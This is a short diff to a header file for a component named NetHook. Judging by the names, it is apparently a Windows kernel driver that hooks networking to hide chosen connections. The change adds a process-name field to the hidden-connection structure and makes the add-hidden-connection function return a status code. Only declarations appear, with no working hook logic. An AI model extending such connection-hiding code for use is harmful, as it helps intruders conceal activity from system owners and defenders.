@@ -13,6 +13,7 @@ namespace NetHook
 		USHORT Port;
 		ULONG RemoteIpAddress;
 		ULONG ConnectPID;
+		UNICODE_STRING ConnectProcess;
 		USHORT _Unknown;    // For Future Use
 	} NETHOOK_HIDDEN_CONNECTION, * PNETHOOK_HIDDEN_CONNECTION;
 
@@ -26,7 +27,7 @@ namespace NetHook
 
 	NTSTATUS InitNetworkHook();
 
-	VOID NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewConnection);
+	NTSTATUS NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewConnection);
 
 	VOID UnHookNetworkProxy();
 
